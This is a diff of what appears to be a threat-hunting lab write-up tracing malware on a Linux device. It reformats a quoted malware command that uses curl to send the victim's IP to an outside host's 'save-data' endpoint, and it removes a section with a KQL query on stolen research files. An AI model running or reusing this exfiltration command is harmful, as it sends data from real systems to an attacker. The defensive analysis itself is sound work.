@@ -380,13 +380,17 @@ The Device carries on as usual with the malware, until a suspcious telnet login 
 
 From that time until 0343 AM, the user applied updates to the linux machine however the malware was still present as observed at 0344 AM when a CRON to update-logs pattern occured. The device then proceeds as usual with the malware until new behavior from the malware was observed at 0448 AM, this behavior is consistent with data exfiltration when observing the code:
 
-``` bash -c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
+
+``` bash
+-c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
 			-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
 			-H 'Accept-Language: en-US,en;q=0.9' \
 			-H 'Cache-Control: max-age=0' \
 			-H 'Connection: keep-alive' \
 			-H 'Upgrade-Insecure-Requests: 1' \
-			--insecure' '''
+			--insecure'
+'''
+
 
 ![image](https://github.com/user-attachments/assets/31143b39-2e80-4ca9-963c-3d242ffc0b0a)
 
@@ -396,23 +400,7 @@ These logs show that the process repeats itself multiple times, indicating that 
 
 This behavior would now be observed in addition to the usual malware behavior throughout the rest of the device's activities
 
-### 3. Analyzing File Events
-To understand the extent of the data compromise, I searched the DeviceFileEvents table for actions initiated by the attacker under the new user account chadwick.s. I discovered that the attacker accessed and likely stole a sensitive file named CRISPR-X__Next-Generation_Gene_Editing_for_Artificial_Evolution.pdf alognside other files in a zip file named gene_editing_papers, a high-value target that could indicate a larger espionage operation targeting proprietary research.
 
-**Query Used**:
-```kql
-DeviceFileEvents
-| where DeviceName == "corpnet-1-ny"
-| where InitiatingProcessAccountName == "chadwick.s"
-| where FileName has_any ("zip")
-| project
-    TimeGenerated,
-    DeviceName,
-    InitiatingProcessAccountName,
-    FileName,
-    InitiatingProcessCommandLine
-```
-![image](https://github.com/user-attachments/assets/d58c6f50-5d26-4b31-9b65-1ebf7e177a57)
 
 
 ### Summary of Findings
